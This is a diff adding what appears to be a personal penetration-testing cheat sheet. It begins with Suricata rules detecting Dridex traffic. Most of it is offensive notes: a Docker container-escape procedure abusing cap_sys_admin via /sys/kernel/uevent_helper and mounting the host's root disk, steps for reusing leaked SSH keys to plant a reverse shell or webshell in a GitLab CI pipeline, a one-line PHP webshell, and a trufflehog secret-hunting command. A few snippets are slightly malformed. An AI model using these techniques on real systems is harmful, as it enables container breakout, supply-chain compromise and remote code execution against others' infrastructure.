@@ -1,0 +1,68 @@
+alert dns any any -> any any (msg:"Known bad DNS lookup, possible Dridex infection";dns.query;content:"<FQDN TO MATCH>";)
+alert http <IP TO MATCH> any <> any any (msg:"Investigate suspicious connections, possible Dridex infection";sid:3334;)
+alert tls any any <> any any (msg:"Investigate bad certificates, possible Dridex infection";sid:3335;tls.cert_subject; content:"CN=<CN TO MATCH>"; isdataat:!1,relative;)
+alert http any any -> any any (msg:"Suspicious JavaScript function, possible Dridex infection"; file_data; content:"let byteCharacters = atob"; sid:00000004;)
+
+
+
+docker :  https://book.hacktricks.xyz/
+#get-out 
+
+1) get root : sudo su
+
+2)checks:
+	check ps : ps aux 
+	find / -name docker.sock 2>/dev/null
+	cat /proc/$$/status | grep "CapEff:"  # look for capEff  / permissions
+
+3)exploit CapEff:
+  	decode CapEff : capsh --decode=0000003fffffffff
+	look for cap_sys_admin () for --privileged exploit flag
+	look for host directory bind to the docker : host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+	create a script that will be exectuted on the host 
+	put it into the host path : echo "$host_path/script.sh" > /sys/kernel/uevent_helper
+	execute it : echo change > /sys/class/mem/null/uevent
+4)exploit mount
+cat /proc/cmdline # check for root=/dev/vda or root=/.*/.*
+mount /dev/vda /mnt/ #mount root partition on mnt docker directory
+
+
+CD/CI:
+2 ways to clone :
+ - no authentificated user : git clone https://<FQDN>/<USER>/<repository>.git 
+ - authentificated user : git clone git@<FQDN>:<USER>/<REPOSITORY>.git
+
+commands : 
+ -git status  													#check project status
+ -git log --oneline												#check project logs (versions)
+ -git diff version_id1 version_id2										#check diff between 2 versions (version_id can be found on logs)
+ -git add <file>												#add file to local project
+ -git commit -m "comment"											#add version modif to local project
+ -git config --global user.email "<EMAIL>"									#add email to config, that w'ill be used on commit commands
+ -git config --global user.name "<NAME>"									#add user name to config, that w'ill be used on commit commands
+ -git push													#update remote version
+
+1)if peer ssh found in logs :
+ -copy private and public keys into /home/<USER>/.ssh/	
+ -get the repository as authentificated user 									#to get more permissions
+ -check .gitlab-ci.yml file											#contians all pipelines CI/CD that we can modify and exploit	(add reverseshell maybe or webshell :D )				
+
+webshell php :
+<?php 
+system($_REQUEST['cmd']);
+php>
+
+
+
+Cloud :
+
+commands : 
+ -aws configure 												#configue aws secret / key id and country 
+
+Trufflehog : 
+ -trufflehog git https://fqdn/user/directory.git								#look for secrets on github
+
+
+NTFS :
+https://github.com/QPetabyte/Merkle_Trees/
+
